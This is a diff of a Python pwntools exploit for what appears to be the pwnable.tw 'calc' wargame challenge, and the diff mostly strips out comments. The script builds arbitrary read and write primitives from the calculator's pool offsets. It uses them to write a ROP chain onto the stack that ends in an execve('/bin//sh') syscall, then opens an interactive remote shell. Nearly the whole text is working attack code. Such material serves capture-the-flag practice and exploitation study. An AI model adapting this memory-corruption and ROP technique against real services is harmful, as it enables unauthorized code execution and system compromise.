@@ -1,17 +1,13 @@
 #!/usr/bin/env python3
 from pwn import *
 
-# -------------------------------------------------------------------------
-# Setup: Connect to the remote challenge server
-# -------------------------------------------------------------------------
+
 io = remote('chall.pwnable.tw', 10100)
 
 # Consume the initial welcome banner
 io.recvline() 
 
-# -------------------------------------------------------------------------
-# Our Arsenal: Arbitrary Read & Write Primitives
-# -------------------------------------------------------------------------
+
 def read_val(offset):
     """
     Read memory at the given pool offset.
@@ -28,7 +24,6 @@ def write_val(offset, target_value):
     """
     current_value = read_val(offset)
     
-    # Calculate difference (handles both positive and negative jumps)
     diff = target_value - current_value
     
     if diff > 0:
@@ -36,19 +31,15 @@ def write_val(offset, target_value):
     elif diff < 0:
         payload = f"+{offset}{diff}" # diff already includes the minus sign (e.g. +361-50)
     else:
-        return # Value is already correct, no need to overwrite
+        return 
         
     io.sendline(payload.encode())
-    io.recvline() # Consume the calculation result to keep the buffer clean
+    io.recvline() #
 
-# -------------------------------------------------------------------------
-# Translating your ROPgadget Payload into Integers
-# -------------------------------------------------------------------------
-# Strings converted to Little-Endian 32-bit Integers
-BIN_CHUNK  = u32(b"/bin")   # 0x6e69622f = 1852400175
-SH_CHUNK   = u32(b"//sh")   # 0x68732f2f = 1752387375
+BIN_CHUNK  = u32(b"/bin")   
+SH_CHUNK   = u32(b"//sh")   
 
-# Map your exact chain sequentially starting at pool[361] (Return Address)
+
 rop_chain = {
     361: 0x080701aa, # pop edx ; ret
     362: 0x080ec060, # @ .data
@@ -89,9 +80,6 @@ rop_chain = {
     394: 0x08049a21  # int 0x80 (syscall)
 }
 
-# -------------------------------------------------------------------------
-# Injecting the Payload & Triggering the Shell
-# -------------------------------------------------------------------------
 log.info("Sequentially writing ROP chain gadgets to stack offsets...")
 for offset, val in rop_chain.items():
     log.info(f"Writing {hex(val)} to pool[{offset}]")
@@ -100,8 +88,6 @@ for offset, val in rop_chain.items():
 log.success("ROP chain successfully written!")
 
 log.info("Sending non-numeric line to trigger function return...")
-# Sending an arbitrary string terminates the calculator loop and calls the "ret" instruction
 io.sendline(b"LET_US_GO") 
 
-# Drop into interactive mode to enjoy your root shell!
 io.interactive()
